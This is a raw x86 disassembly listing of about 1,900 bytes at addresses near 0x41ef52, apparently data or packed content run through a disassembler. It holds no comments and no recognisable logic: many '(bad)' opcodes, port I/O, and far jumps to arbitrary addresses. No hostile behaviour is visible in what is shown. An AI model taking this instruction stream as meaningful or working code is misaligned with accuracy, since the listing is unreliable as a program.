  41ef52:	(bad)  
  41ef53:	push   esi
  41ef54:	mov    al,0x13
  41ef56:	sbb    al,0xc8
  41ef58:	fdivr  QWORD PTR [eax-0x1]
  41ef5b:	xchg   ecx,eax
  41ef5c:	sbb    al,0x4d
  41ef5e:	mov    DWORD PTR [edx-0x301a5659],eax
  41ef64:	jmp    0x3dbf5aa
  41ef69:	push   ebx
  41ef6a:	add    ecx,0x49488dee
  41ef70:	sbb    esp,ebx
  41ef72:	and    al,0x69
  41ef74:	jmp    0xae49809a
  41ef79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef7a:	adc    eax,0x393f18a2
  41ef7f:	xchg   esp,eax
  41ef80:	lock cmc 
  41ef82:	jns    0x41ef7b
  41ef84:	mov    dl,0x57
  41ef86:	mov    esp,ebx
  41ef88:	jge    0x41ef2f
  41ef8a:	dec    eax
  41ef8b:	pop    ebp
  41ef8c:	in     al,0xe2
  41ef8e:	aad    0x9a
  41ef90:	add    edx,DWORD PTR [eax+0x3721b47]
  41ef96:	jp     0x41efbd
  41ef98:	mov    eax,ds:0xb73ea9b5
  41ef9d:	in     al,dx
  41ef9e:	dec    esi
  41ef9f:	pop    esi
  41efa0:	call   0x8e5d:0xdf8e8549
  41efa7:	aad    0x6c
  41efa9:	sub    cl,BYTE PTR [edi]
  41efab:	enter  0x1c58,0xed
  41efaf:	repz jno 0x41f016
  41efb2:	adc    eax,0xa3f847de
  41efb7:	sti    
  41efb8:	xor    cl,BYTE PTR [edi+edi*4-0x54c96634]
  41efbf:	add    eax,0xaf1e5a94
  41efc4:	sub    BYTE PTR [esi+0x19],0xf8
  41efc8:	rcl    BYTE PTR [eax],0xf2
  41efcb:	scas   al,BYTE PTR es:[edi]
  41efcc:	and    esi,DWORD PTR [ecx+esi*8]
  41efcf:	out    dx,al
  41efd0:	add    DWORD PTR [edx+edx*2],ecx
  41efd3:	xor    al,0xf4
  41efd5:	add    eax,0x8b278968
  41efdb:	cmp    ah,BYTE PTR [edi+0x3bccf490]
  41efe1:	shl    DWORD PTR [ebx+ecx*8],cl
  41efe4:	jle    0x41efc7
  41efe6:	inc    ebp
  41efe7:	mov    ds:0xbd533f50,eax
  41efec:	mov    dl,0xb3
  41efee:	hlt    
  41efef:	dec    edx
  41eff0:	sub    ebp,DWORD PTR [ecx]
  41eff2:	scas   eax,DWORD PTR es:[edi]
  41eff3:	add    eax,0x1f71a2d
  41eff8:	dec    esp
  41eff9:	or     esp,ecx
  41effb:	mov    ds:0x6bdbafe8,eax
  41f000:	fs jmp 0x41f017
  41f003:	into   
  41f004:	dec    esi
  41f005:	mov    ?,WORD PTR [edx-0x1a]
  41f008:	dec    ecx
  41f009:	iret   
  41f00a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f00b:	fwait
  41f00c:	out    0xe1,al
  41f00e:	les    ebx,FWORD PTR [ebx-0x4f]
  41f011:	jno    0x41f036
  41f013:	into   
  41f014:	jne    0x41efda
  41f016:	stos   BYTE PTR es:[edi],al
  41f017:	add    DWORD PTR [ebp+ebx*4+0x1ee89ad],ecx
  41f01e:	repz mov al,ds:0x5a714610
  41f024:	fnsave [ebx+0x0]
  41f027:	sbb    al,0x51
  41f029:	lods   eax,DWORD PTR ds:[esi]
  41f02a:	cmc    
  41f02b:	mov    es,WORD PTR [ebx-0x25441b12]
  41f031:	xor    al,0x6a
  41f033:	push   ecx
  41f034:	pop    edi
  41f035:	or     ch,BYTE PTR [ebx]
  41f037:	adc    bl,BYTE PTR [ebx+0x7f]
  41f03a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f03b:	sub    ah,0x50
  41f03e:	jmp    0x4ac1:0x6ebfb1f3
  41f045:	out    0xfb,eax
  41f047:	lods   eax,DWORD PTR ds:[esi]
  41f049:	pop    es
  41f04a:	adc    al,0xa9
  41f04c:	pop    esp
  41f04d:	mov    bl,bl
  41f04f:	mov    ds:0x378926cd,al
  41f054:	pop    ss
  41f055:	test   BYTE PTR [ebp-0x1b],cl
  41f058:	cmp    ebp,DWORD PTR ds:0x825375af
  41f05e:	pop    es
  41f05f:	inc    edi
  41f060:	adc    esp,ecx
  41f062:	jae    0x41f03e
  41f064:	call   0x9140:0x86ab606c
  41f06b:	test   al,0x7c
  41f06d:	jg     0x41eff2
  41f06f:	and    DWORD PTR [esi-0x6443550d],0x95171245
  41f079:	lea    edx,[ebx]
  41f07b:	cmc    
  41f07c:	out    0xaa,eax
  41f07e:	dec    ebp
  41f07f:	sub    esi,DWORD PTR [ebx+0x2be62de3]
  41f085:	fdivr  DWORD PTR [eax-0x7a6762f2]
  41f08b:	fild   DWORD PTR [edi-0x3]
  41f08e:	and    cl,al
  41f090:	sub    DWORD PTR [edx+0x5e],0x6d
  41f094:	pop    es
  41f095:	mov    dh,0x79
  41f097:	aas    
  41f098:	xlat   BYTE PTR ds:[ebx]
  41f099:	cmp    ecx,DWORD PTR [ebp+eiz*4+0x34c50e9]
  41f0a0:	retf   0xc8af
  41f0a3:	xchg   edx,eax
  41f0a4:	sti    
  41f0a5:	in     al,0x96
  41f0a7:	push   edi
  41f0a8:	mov    dl,0x33
  41f0aa:	inc    edx
  41f0ab:	push   edi
  41f0ac:	pop    eax
  41f0ad:	add    ebx,DWORD PTR [esi]
  41f0af:	enter  0x6f9,0x42
  41f0b3:	and    dh,BYTE PTR [edi]
  41f0b5:	(bad)  
  41f0b6:	sbb    al,0x6f
  41f0b8:	or     DWORD PTR [esp+edi*8],ebx
  41f0bb:	inc    ecx
  41f0bc:	inc    ebp
  41f0bd:	push   0xffffff8b
  41f0bf:	repnz mov WORD PTR [ebx-0x1],gs
  41f0c3:	fist   DWORD PTR [ebp+0x7c43a4d2]
  41f0c9:	in     al,0xc0
  41f0cb:	push   ecx
  41f0cc:	add    dl,dl
  41f0ce:	xchg   BYTE PTR [ebx],dl
  41f0d0:	jl     0x41f148
  41f0d2:	or     BYTE PTR [edx+0x71836a15],dh
  41f0d8:	sbb    al,0x4f
  41f0da:	xchg   BYTE PTR fs:[ebx],dl
  41f0dd:	scas   al,BYTE PTR es:[edi]
  41f0de:	xor    BYTE PTR [eax+ebp*4+0x173841f4],bh
  41f0e5:	(bad)  
  41f0e6:	stos   DWORD PTR es:[edi],eax
  41f0e7:	xlat   BYTE PTR ds:[ebx]
  41f0e8:	das    
  41f0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0ea:	jp     0x41f0c4
  41f0ec:	hlt    
  41f0ed:	pop    ebx
  41f0ee:	(bad)  
  41f0ef:	test   al,0x49
  41f0f1:	pop    ecx
  41f0f2:	adc    DWORD PTR [eax-0x36ce3cfe],0x4d124196
  41f0fc:	aaa    
  41f0fd:	pop    ebx
  41f0fe:	inc    ebx
  41f0ff:	inc    ebx
  41f100:	jne    0x41f0b7
  41f102:	xchg   ebx,eax
  41f103:	adc    eax,0xf579a54f
  41f108:	mov    al,dh
  41f10a:	enter  0x2551,0xcc
  41f10e:	jmp    0x41f139
  41f110:	sub    DWORD PTR [ebp+0x27aea852],ecx
  41f116:	enter  0xa20b,0xc2
  41f11a:	mov    ecx,0x21dbbc65
  41f11f:	pop    edx
  41f120:	test   ch,ch
  41f122:	mov    ah,0x3b
  41f124:	sbb    esp,esi
  41f126:	xor    al,0xed
  41f128:	scas   al,BYTE PTR es:[edi]
  41f129:	lock pop edi
  41f12b:	cdq    
  41f12c:	add    al,0xe5
  41f12e:	mov    ebp,0x5d70a22f
  41f133:	push   DWORD PTR [edx-0x70]
  41f136:	inc    ebp
  41f138:	xor    al,BYTE PTR [eax-0x49746599]
  41f13e:	(bad)  
  41f13f:	repz dec esp
  41f141:	aaa    
  41f142:	push   0xffffffa8
  41f144:	mov    DWORD PTR [ebx+0x41887938],esp
  41f14a:	fdivr  DWORD PTR [ebp+0x2f]
  41f14d:	and    esp,eax
  41f14f:	ficom  WORD PTR [esi+esi*2-0x6ac1891e]
  41f156:	stos   BYTE PTR es:[edi],al
  41f157:	or     bh,BYTE PTR [eax+0x58497be6]
  41f15d:	imul   ebp,ebx,0xffffffcd
  41f160:	mov    ah,0x86
  41f162:	xchg   ebp,eax
  41f163:	pop    esp
  41f164:	push   ds
  41f165:	mov    ds:0x1ea7f9b,eax
  41f16a:	xchg   BYTE PTR [ebx+0x395ac085],ch
  41f170:	inc    ebp
  41f171:	or     dl,BYTE PTR fs:[ebx+0x2b]
  41f175:	test   al,0x68
  41f177:	sub    BYTE PTR [ebx+0xf692ee4],dh
  41f17d:	dec    eax
  41f17e:	int3   
  41f17f:	out    0x6e,eax
  41f181:	std    
  41f182:	sub    eax,ecx
  41f184:	retf   
  41f185:	in     eax,0xc
  41f187:	imul   ebp,DWORD PTR [ebx+esi*8+0x26db7e3],0x2a8a4ea3
  41f192:	add    esi,edx
  41f194:	cmp    dl,BYTE PTR [eax]
  41f196:	bound  edx,QWORD PTR [edx-0x3da66486]
  41f19c:	jp     0x41f20d
  41f19e:	les    esp,FWORD PTR [esi]
  41f1a0:	sbb    ecx,DWORD PTR [edx+0x5a]
  41f1a3:	inc    esp
  41f1a4:	or     eax,DWORD PTR [edx]
  41f1a6:	pop    eax
  41f1a7:	add    eax,ebx
  41f1a9:	ret    
  41f1aa:	xor    ah,BYTE PTR [edi-0x2d]
  41f1ad:	fs rol edi,1
  41f1b0:	xchg   esp,eax
  41f1b1:	arpl   WORD PTR [esi-0x4d],di
  41f1b4:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41f1b6:	rol    DWORD PTR ds:0xf17e30c4,cl
  41f1bc:	cli    
  41f1bd:	dec    ecx
  41f1be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1bf:	mov    ds:0x427d347a,eax
  41f1c4:	push   edi
  41f1c5:	or     bl,ch
  41f1c7:	imul   eax,DWORD PTR [ecx+edx*8+0x20],0xffffffad
  41f1cc:	outs   dx,BYTE PTR ds:[esi]
  41f1cd:	call   0x770e4f9e
  41f1d2:	mov    ah,0x1a
  41f1d4:	jmp    0x2802:0x87b11373
  41f1db:	leave  
  41f1dc:	sbb    DWORD PTR [edi-0x7e],ebx
  41f1df:	xchg   BYTE PTR [edi+esi*4-0x10],ch
  41f1e3:	jnp    0x41f1ab
  41f1e5:	stos   DWORD PTR es:[edi],eax
  41f1e6:	mov    edi,0x267c1509
  41f1eb:	test   eax,0x18309e38
  41f1f0:	hlt    
  41f1f1:	imul   esp,DWORD PTR [eax],0xffffff8c
  41f1f4:	scas   eax,DWORD PTR es:[edi]
  41f1f5:	jp     0x41f1fd
  41f1f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1f8:	cli    
  41f1f9:	scas   al,BYTE PTR es:[edi]
  41f1fa:	sahf   
  41f1fb:	loopne 0x41f248
  41f1fd:	xor    esp,DWORD PTR [edi+0x1]
  41f200:	jmp    0x5088f2a4
  41f205:	stc    
  41f206:	rcl    BYTE PTR [edx+0x1f],cl
  41f209:	out    0x77,al
  41f20b:	jno    0x41f1da
  41f20d:	int    0x91
  41f20f:	xor    al,0xc8
  41f212:	dec    esp
  41f213:	cwde   
  41f214:	je     0x41f1e1
  41f216:	adc    al,0x6e
  41f218:	mov    eax,0x79bfe921
  41f21d:	popa   
  41f21e:	aad    0x7b
  41f220:	(bad)  
  41f221:	xlat   BYTE PTR ds:[ebx]
  41f222:	sbb    eax,0x3650e7c2
  41f227:	js     0x41f1af
  41f229:	dec    ebp
  41f22a:	mov    ds:0x22ef62d6,al
  41f22f:	mov    ch,0x5a
  41f231:	xor    eax,0xc0c8c4ea
  41f236:	inc    esi
  41f237:	cdq    
  41f238:	in     eax,0x1a
  41f23a:	jae    0x41f259
  41f23c:	pop    ebx
  41f23d:	ds (bad) 
  41f23f:	fdiv   DWORD PTR [edx+0x20950e2e]
  41f245:	xchg   esp,eax
  41f246:	xchg   edi,eax
  41f247:	mov    esp,0x8f638453
  41f24c:	mov    dl,0x6f
  41f24e:	jo     0x41f1e7
  41f250:	cdq    
  41f251:	or     al,0xaa
  41f253:	test   al,0xb0
  41f255:	xor    dl,bh
  41f257:	fcmovnbe st,st(1)
  41f259:	pushf  
  41f25a:	loopne 0x41f1ea
  41f25c:	xchg   edx,eax
  41f25d:	(bad)  
  41f25e:	xchg   edi,eax
  41f25f:	xor    ebx,ecx
  41f261:	imul   edi,DWORD PTR [eax+0x6b],0xffffffcd
  41f265:	xor    DWORD PTR [edi+0x467d4a96],edx
  41f26b:	sub    dl,BYTE PTR [edx]
  41f26d:	add    ah,BYTE PTR [ebx+0xb1ca177]
  41f273:	in     al,dx
  41f274:	adc    ah,BYTE PTR [ecx-0x18]
  41f277:	jmp    0x1ef2:0x9ab07c28
  41f27e:	and    edi,ecx
  41f280:	iret   
  41f281:	sti    
  41f282:	push   edx
  41f283:	jnp    0x41f20e
  41f285:	cdq    
  41f286:	shl    DWORD PTR [edx],1
  41f288:	and    BYTE PTR [ecx],bh
  41f28a:	mov    dh,0x3d
  41f28c:	dec    esi
  41f28d:	retf   0xa2c2
  41f290:	sbb    BYTE PTR [ebp+0x7726c873],0xa6
  41f297:	jns    0x41f300
  41f299:	rol    BYTE PTR [ebx-0x7159690a],0xff
  41f2a0:	cmp    eax,DWORD PTR [eax+0x51d22047]
  41f2a6:	mov    esi,0x916f8061
  41f2ab:	xor    ebp,ebp
  41f2ad:	bound  edx,QWORD PTR [ebx-0x51]
  41f2b0:	sbb    eax,0x6abbb045
  41f2b5:	or     dh,BYTE PTR [edi+0x5708902f]
  41f2bb:	cmp    ecx,ebp
  41f2bd:	jb     0x41f2cd
  41f2bf:	retf   
  41f2c0:	(bad)
  41f2c4:	push   0xffffffe2
  41f2c6:	into   
  41f2c7:	xor    eax,eax
  41f2c9:	adc    al,0x72
  41f2cb:	adc    BYTE PTR [bx+0x1692],al
  41f2d0:	xor    al,0x48
  41f2d2:	push   cs
  41f2d3:	jno    0x41f2eb
  41f2d5:	mov    esi,0x48109c32
  41f2da:	pop    esi
  41f2db:	dec    esp
  41f2dc:	or     ch,ch
  41f2de:	scas   eax,DWORD PTR es:[edi]
  41f2df:	pop    ss
  41f2e0:	push   ebp
  41f2e1:	ret    
  41f2e2:	adc    eax,0x83aff7ce
  41f2e7:	and    esi,esp
  41f2e9:	jnp    0x41f343
  41f2eb:	test   DWORD PTR [ebp-0x16],edx
  41f2ee:	pmaxsw mm5,mm1
  41f2f1:	mov    eax,ds:0x944c078c
  41f2f6:	in     eax,0x7a
  41f2f8:	cmovbe esi,DWORD PTR [ebp+edx*4-0x68a89227]
  41f300:	sbb    ebp,DWORD PTR [edx+ebp*8]
  41f303:	fcomp  QWORD PTR [edx]
  41f305:	shl    BYTE PTR [eax+ebx*8-0x1e3b65d1],0xd7
  41f30d:	push   eax
  41f30e:	data16 aas 
  41f310:	(bad)  
  41f311:	push   0xe69e9173
  41f316:	jno    0x41f36a
  41f318:	inc    ebp
  41f319:	icebp  
  41f31a:	add    DWORD PTR [edx-0x79],eax
  41f31d:	jp     0x41f363
  41f31f:	sbb    ah,BYTE PTR [edi+0x54e108d3]
  41f325:	ror    DWORD PTR [esi],1
  41f327:	cli    
  41f328:	pop    esp
  41f329:	push   esp
  41f32a:	fcom   QWORD PTR [eax+0x49]
  41f32d:	fisub  WORD PTR [eax-0xb6d2fa9]
  41f333:	jmp    0x41f365
  41f335:	mov    bh,0xf9
  41f337:	cld    
  41f338:	outs   dx,BYTE PTR ds:[esi]
  41f339:	xchg   BYTE PTR [edx-0x190257bc],dl
  41f33f:	pop    edi
  41f340:	std    
  41f341:	inc    ebx
  41f342:	mov    esp,0xbbc9ba32
  41f347:	gs push esp
  41f349:	xchg   edx,eax
  41f34a:	pop    DWORD PTR [ecx+edx*2]
  41f34d:	fwait
  41f34e:	dec    eax
  41f34f:	stc    
  41f350:	add    al,0x7
  41f352:	outs   dx,BYTE PTR ds:[esi]
  41f353:	jns    0x41f349
  41f355:	xor    BYTE PTR [ebx],bl
  41f357:	stc    
  41f358:	arpl   WORD PTR [esi+0x3],di
  41f35b:	clc    
  41f35c:	ret    0x1298
  41f35f:	rcr    BYTE PTR [ebp+eiz*1-0x4e736283],cl
  41f366:	mov    bh,0xb3
  41f368:	mov    edx,0x8e1ac550
  41f36d:	sbb    al,0x69
  41f36f:	imul   ecx,DWORD PTR ds:0x21d0a98c,0xcbe562a3
  41f379:	sbb    dh,bl
  41f37b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f37c:	mov    eax,0xd9229e59
  41f381:	and    al,bh
  41f383:	ds in  al,0x89
  41f386:	push   ss
  41f387:	rol    BYTE PTR [edx-0x6b0435b4],cl
  41f38d:	push   edx
  41f38e:	sbb    edx,DWORD PTR [ebx-0x2692240a]
  41f394:	add    ah,BYTE PTR [ecx]
  41f396:	aas    
  41f397:	push   ebp
  41f398:	ror    esp,1
  41f39a:	aas    
  41f39b:	cmp    DWORD PTR [ecx],ebp
  41f39d:	cmc    
  41f39e:	sbb    bl,BYTE PTR [edi-0x286c4c62]
  41f3a4:	adc    eax,eax
  41f3a6:	gs sti 
  41f3a8:	cmp    eax,0x74685c5a
  41f3ad:	cmp    ecx,DWORD PTR [esi]
  41f3af:	gs out dx,al
  41f3b1:	push   eax
  41f3b2:	sub    DWORD PTR [esi-0x12],ebx
  41f3b5:	mov    eax,0x8d61a2c5
  41f3ba:	in     al,dx
  41f3bb:	shl    DWORD PTR [edx+0x4c],cl
  41f3be:	shl    DWORD PTR [ebp-0x64],1
  41f3c1:	xchg   esi,eax
  41f3c2:	ja     0x41f394
  41f3c4:	daa    
  41f3c5:	add    BYTE PTR [esi+0x74],cl
  41f3c8:	in     eax,dx
  41f3c9:	jb     0x41f44a
  41f3cb:	pop    ebp
  41f3cc:	int3   
  41f3cd:	push   esi
  41f3ce:	mov    edi,0xa4fe9df
  41f3d3:	and    bh,BYTE PTR [eax+edx*2+0xc]
  41f3d7:	pop    ds
  41f3d8:	aaa    
  41f3d9:	int    0x5d
  41f3db:	(bad)  [ebx+0x34]
  41f3de:	aas    
  41f3df:	pop    eax
  41f3e0:	jmp    0xc7af0cf2
  41f3e5:	pop    esi
  41f3e6:	push   esi
  41f3e7:	adc    eax,0xfc73c952
  41f3ec:	and    al,0x2e
  41f3ee:	mov    ebp,0xa1bc666
  41f3f3:	repnz or DWORD PTR [ecx-0x3409d0ab],edi
  41f3fa:	fidivr WORD PTR [esp+ebx*1-0x46]
  41f3fe:	idiv   BYTE PTR [ebp-0x9]
  41f401:	inc    ebx
  41f402:	sub    BYTE PTR [ecx+0x7],bl
  41f405:	xor    esi,DWORD PTR [esi+ebx*1+0x7b]
  41f409:	ins    BYTE PTR es:[edi],dx
  41f40a:	inc    ebp
  41f40b:	dec    esi
  41f40c:	in     eax,0xb
  41f40e:	out    dx,eax
  41f40f:	std    
  41f410:	enter  0x343f,0x14
  41f414:	jo     0x41f43b
  41f416:	and    eax,0xfaa5286b
  41f41b:	sbb    eax,DWORD PTR [eax-0x62]
  41f41e:	adc    eax,0x199d6235
  41f423:	inc    ebx
  41f424:	inc    ebx
  41f425:	cmp    al,0x60
  41f427:	ja     0x41f3bf
  41f429:	mov    ch,0xd9
  41f42b:	aam    0xb6
  41f42d:	xchg   esp,eax
  41f42e:	fld    QWORD PTR [ebp+0x32]
  41f431:	push   ebp
  41f432:	add    dh,BYTE PTR [edx+0x48d8d76b]
  41f438:	push   0x6c862768
  41f43d:	sbb    al,0xfc
  41f43f:	adc    al,0xda
  41f441:	adc    DWORD PTR [eax-0x3467b357],ebp
  41f447:	fst    DWORD PTR [ecx-0x2a]
  41f44a:	test   esi,edi
  41f44c:	and    al,0x23
  41f44e:	add    BYTE PTR [ebp-0x51],ah
  41f451:	push   edx
  41f452:	mov    dl,al
  41f454:	push   ecx
  41f455:	sbb    DWORD PTR [eax-0x25],0xd3c5dde5
  41f45c:	jp     0x41f3f2
  41f45e:	mov    ebp,0x905bb902
  41f463:	fdiv   DWORD PTR [edi+0x2b]
  41f466:	out    0xbd,eax
  41f468:	into   
  41f469:	dec    DWORD PTR [esi+0x47]
  41f46c:	push   esi
  41f46d:	inc    esi
  41f46e:	dec    esp
  41f46f:	cwde   
  41f470:	pop    ebx
  41f471:	inc    eax
  41f472:	add    al,0x84
  41f474:	retf   0x586d
  41f477:	fsub   DWORD PTR [esi]
  41f479:	(bad)  
  41f47b:	fimul  DWORD PTR [edi]
  41f47d:	xchg   ebx,eax
  41f47e:	inc    ebx
  41f47f:	jmp    0xce8e95f9
  41f484:	hlt    
  41f485:	iret   
  41f486:	jns    0x41f40f
  41f488:	dec    esp
  41f489:	ret    0xbee7
  41f48c:	and    BYTE PTR [eax],dl
  41f48e:	dec    ecx
  41f48f:	jo     0x41f48e
  41f491:	or     BYTE PTR [esi+0x4b575c55],ah
  41f497:	adc    DWORD PTR [ebx],0xfffffffd
  41f49a:	jo     0x41f483
  41f49c:	fs retf 
  41f49e:	lods   al,BYTE PTR ds:[esi]
  41f49f:	inc    edx
  41f4a0:	xchg   ecx,eax
  41f4a1:	push   eax
  41f4a2:	ins    BYTE PTR es:[edi],dx
  41f4a3:	data16 stos BYTE PTR es:[edi],al
  41f4a5:	inc    ebx
  41f4a6:	push   edx
  41f4a7:	pop    ds
  41f4a8:	fisub  DWORD PTR ds:0x43c6bd89
  41f4ae:	sub    DWORD PTR ds:[edi+0x2b39ed22],0x30
  41f4b6:	or     BYTE PTR [ecx+0x743ceb41],0x78
  41f4bd:	aam    0xee
  41f4bf:	shl    DWORD PTR [ecx],0xd8
  41f4c2:	pop    ds
  41f4c3:	sub    ah,BYTE PTR ds:0x2c5e7c4d
  41f4c9:	inc    ecx
  41f4ca:	jae    0x41f4b4
  41f4cc:	inc    ecx
  41f4cd:	scas   al,BYTE PTR es:[edi]
  41f4ce:	adc    ecx,DWORD PTR [esi]
  41f4d0:	ja     0x41f4b4
  41f4d2:	adc    dh,BYTE PTR [ebx]
  41f4d4:	mov    ebx,0x6b748edc
  41f4d9:	adc    DWORD PTR [eax],esi
  41f4db:	iret   
  41f4dc:	xor    DWORD PTR [edx-0x3c],0x3f
  41f4e0:	inc    ebp
  41f4e1:	in     al,0xc8
  41f4e3:	mov    eax,ds:0x7421853b
  41f4e8:	or     al,0x74
  41f4ea:	das    
  41f4eb:	dec    ebx
  41f4ec:	sahf   
  41f4ed:	xchg   esi,eax
  41f4ee:	jp     0x41f4a8
  41f4f0:	dec    esp
  41f4f1:	je     0x41f4b3
  41f4f3:	stos   DWORD PTR es:[edi],eax
  41f4f4:	push   ds
  41f4f5:	add    eax,0xc50cf871
  41f4fa:	xchg   esp,eax
  41f4fb:	ds mov dl,0x11
  41f4fe:	rol    BYTE PTR [ebx],0x89
  41f501:	or     eax,0x1a039221
  41f506:	mov    ds:0xe0017054,al
  41f50b:	add    esp,DWORD PTR [ebp+0x25]
  41f50e:	sub    ebp,DWORD PTR [eax-0x6040f434]
  41f514:	mov    dl,0xa0
  41f516:	popa   
  41f517:	jne    0x41f53b
  41f519:	in     al,dx
  41f51a:	cmp    ebp,DWORD PTR [eax-0x65ea0b92]
  41f520:	adc    DWORD PTR [ebx+ecx*2+0x762411a8],edx
  41f527:	sbb    dl,BYTE PTR [esp+ecx*4+0x493a09aa]
  41f52e:	adc    dl,BYTE PTR [ebp-0x1f]
  41f531:	mov    ch,0xfd
  41f533:	fdivr  QWORD PTR [esi-0x2f]
  41f536:	xchg   DWORD PTR [edx],edi
  41f538:	jge    0x41f511
  41f53a:	adc    eax,0xf8994f0f
  41f53f:	aad    0x1a
  41f541:	and    eax,0x381e038e
  41f546:	ins    BYTE PTR es:[edi],dx
  41f547:	push   ebx
  41f548:	push   0x540fe7cc
  41f54d:	mov    ds:0x13dbe1b1,eax
  41f552:	jmp    0x41f5ae
  41f554:	cs pop ss
  41f556:	ret    
  41f557:	(bad)  
  41f558:	sub    eax,ebp
  41f55a:	or     DWORD PTR [ebp-0x422ce9b5],edx
  41f560:	cmp    al,0xf2
  41f562:	pop    ds
  41f563:	icebp  
  41f564:	mov    ch,0xcb
  41f566:	dec    ebp
  41f567:	popa   
  41f568:	push   cs
  41f569:	ds ret 0x8960
  41f56d:	cs scas al,BYTE PTR es:[edi]
  41f56f:	nop
  41f570:	cli    
  41f571:	in     eax,0x3d
  41f573:	or     esp,DWORD PTR [edx+0xf93dfe7]
  41f579:	ja     0x41f5dc
  41f57b:	cmovbe ebp,esp
  41f57e:	lds    ecx,FWORD PTR [edi+0x68]
  41f581:	sbb    BYTE PTR [edi],0x70
  41f584:	mov    ds:0x29b18ad5,al
  41f589:	pushf  
  41f58a:	or     al,0xf
  41f58c:	inc    edx
  41f58d:	dec    esi
  41f58e:	cmc    
  41f58f:	push   ecx
  41f590:	add    eax,0x6f388c9b
  41f595:	or     edi,0x77
  41f598:	into   
  41f599:	stc    
  41f59a:	xchg   di,ax
  41f59c:	xor    cl,al
  41f59e:	or     BYTE PTR [ebp+0x3cbce04e],ch
  41f5a4:	sub    BYTE PTR ds:0x18eb5da8,dl
  41f5aa:	scas   al,BYTE PTR es:[edi]
  41f5ab:	aad    0xd6
  41f5ad:	jns    0x41f562
  41f5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5b0:	and    dl,BYTE PTR ds:0x23c2aaaf
  41f5b6:	fist   DWORD PTR [eax]
  41f5b8:	or     esp,DWORD PTR [ebp-0x1d]
  41f5bb:	mov    cl,0xf8
  41f5bd:	mov    DWORD PTR [eax],edi
  41f5bf:	pop    ecx
  41f5c0:	and    BYTE PTR [eax+eax*8],al
  41f5c3:	dec    ebx
  41f5c4:	push   0xefbcf705
  41f5c9:	cwde   
  41f5ca:	mov    ecx,ebx
  41f5cc:	push   0x825f2f3d
  41f5d1:	imul   edx,eax,0x46b3b936
  41f5d7:	outs   dx,BYTE PTR ds:[esi]
  41f5d8:	fcom   QWORD PTR [esi-0x44]
  41f5db:	dec    ebx
  41f5dc:	xlat   BYTE PTR ds:[ebx]
  41f5dd:	daa    
  41f5de:	ret    0x9c65
  41f5e1:	and    eax,0x80cfe287
  41f5e6:	xchg   ebx,eax
  41f5e7:	inc    ecx
  41f5e8:	in     al,0x75
  41f5ea:	lods   al,BYTE PTR ds:[esi]
  41f5eb:	mov    ecx,DWORD PTR [ecx-0x8]
  41f5ee:	mul    BYTE PTR [ecx+eax*4-0x7d]
  41f5f2:	or     ebp,DWORD PTR [ecx-0x69149bb2]
  41f5f8:	mov    dl,0xd9
  41f5fa:	jmp    0x61951828
  41f5ff:	cmp    ch,BYTE PTR [esi-0x2e]
  41f602:	xchg   esi,eax
  41f603:	stc    
  41f604:	lahf   
  41f605:	pop    esi
  41f606:	setno  BYTE PTR [esi]
  41f609:	sahf   
  41f60a:	stc    
  41f60b:	xchg   ebp,eax
  41f60c:	push   edx
  41f60d:	sbb    eax,0x5881ea96
  41f612:	or     al,0xe8
  41f614:	jbe    0x41f60f
  41f616:	jmp    0xc8c4:0x589caa09
  41f61d:	mov    dl,0x3c
  41f61f:	mov    al,BYTE PTR [ebp+0x1a97b15b]
  41f625:	je     0x41f5b1
  41f627:	mov    ecx,0x710a3c87
  41f62c:	dec    ecx
  41f62d:	cmp    BYTE PTR [esi+0x2fc6958e],0xe2
  41f634:	mov    edi,0x49da7de8
  41f639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f63a:	and    eax,eax
  41f63c:	test   al,0x46
  41f63e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f63f:	or     DWORD PTR [ebx+0x19d48173],esi
  41f645:	mov    WORD PTR [edi-0x42],fs
  41f648:	dec    esp
  41f649:	loop   0x41f6b5
  41f64b:	in     al,0xd5
  41f64d:	int3   
  41f64e:	mov    ebp,0xfc39d6dc
  41f653:	add    al,BYTE PTR [ecx-0x21]
  41f656:	xchg   esi,eax
  41f657:	into   
  41f658:	call   0xa6c759c0
  41f65d:	addr16 (bad) 
  41f65f:	xchg   BYTE PTR [edi+0x797c5043],al
  41f665:	mov    ah,0xe0
  41f667:	mov    ah,0xd4
  41f669:	xchg   BYTE PTR [ebp-0x462fc9f6],cl
  41f66f:	jns    0x41f6e8
  41f671:	popf   
  41f672:	test   al,0x39
  41f674:	mov    al,ds:0xb2b800da
  41f679:	dec    eax
  41f67a:	cdq    
  41f67b:	std    
  41f67c:	mov    esp,0x632de124
  41f681:	inc    ebx
  41f682:	xchg   ebx,eax
  41f683:	(bad)  
  41f684:	test   al,0xfb
  41f686:	xor    edi,DWORD PTR [ebp+0xb]
  41f689:	dec    eax
  41f68a:	bndldx bnd3,[eax-0x1f]
  41f68e:	sub    eax,edi
  41f690:	sbb    ah,BYTE PTR [edx]
  41f692:	jmp    0xbea8d2a5
  41f697:	or     DWORD PTR [edi],0x8
  41f69a:	and    cl,ch
  41f69c:	in     eax,dx
  41f69d:	ins    DWORD PTR es:[edi],dx
  41f69e:	inc    edi
  41f69f:	adc    BYTE PTR [esi],bl
  41f6a1:	cmp    DWORD PTR [edi+0x4a],eax
  41f6a4:	cmp    bl,BYTE PTR [ebx+0x7a67f6ad]
  41f6aa:	and    edx,DWORD PTR [edi]
  41f6ac:	xor    BYTE PTR [ecx+0x26df3a35],bh
  41f6b2:	rcl    ebx,cl
  41f6b4:	iret   
  41f6b5:	in     al,dx
  41f6b6:	test   edi,edx
  41f6b8:	mov    bl,0x55
  41f6ba:	push   0xffffffdf
  41f6bc:	and    edi,esp
  41f6be:	jo     0x41f66a
  41f6c0:	mul    BYTE PTR ds:0x86623498
  41f6c6:	test   DWORD PTR [edi-0x34],ebp
  41f6c9:	and    cl,BYTE PTR [ebx-0x36083bf0]
